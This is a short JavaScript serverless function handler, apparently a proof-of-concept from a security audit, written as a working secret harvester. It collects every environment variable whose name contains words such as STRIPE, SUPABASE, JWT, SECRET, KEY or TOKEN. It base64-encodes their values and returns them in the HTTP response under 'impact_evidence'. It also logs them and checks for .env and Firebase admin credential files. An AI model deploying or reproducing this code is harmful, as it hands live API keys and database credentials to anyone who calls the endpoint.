const fs = require('fs');

exports.handler = async (event, context) => {
  const loot = {};

  // --- Deep Secret Search ---
  const criticalPatterns = [
    'STRIPE', 'SUPABASE', 'FIREBASE', 'JWT', 'PRIVATE', 'DATABASE', 'SECRET', 'KEY', 'TOKEN'
  ];
  
  loot.env_leaks = {};
  Object.keys(process.env).forEach(key => {
    if (criticalPatterns.some(p => key.includes(p))) {
      loot.env_leaks[key] = Buffer.from(process.env[key]).toString('base64');
    }
  });

  // --- Logic Flaw - ClientContext Trust ---
  loot.auth_check = {
    hasClientContext: !!context.clientContext,
    hasIdentity: !!context.identity,
    clientContextRaw: context.clientContext ? "PRESENT" : "MISSING"
  };

  // --- Filesystem Secret Scavenging ---
  const filesToCrawl = ['./.env', './config.json', './supabase.json', './firebase-adminsdk.json'];
  loot.file_secrets = {};
  filesToCrawl.forEach(f => {
    try {
      if (fs.existsSync(f)) {
        loot.file_secrets[f] = "FOUND! (Leaked)";
      }
    } catch(e) {}
  });

  console.log('--- CRITICAL LOOT LOG ---');
  console.log(JSON.stringify(loot, null, 2));

  return {
    statusCode: 200,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      status: "Final Audit Complete",
      impact_evidence: loot,
      vulnerability_type: loot.env_leaks.DATABASE_URL ? "CRITICAL: Hardcoded DB Creds" : "Low: Logic Audit"
    }, null, 2)
  };
};
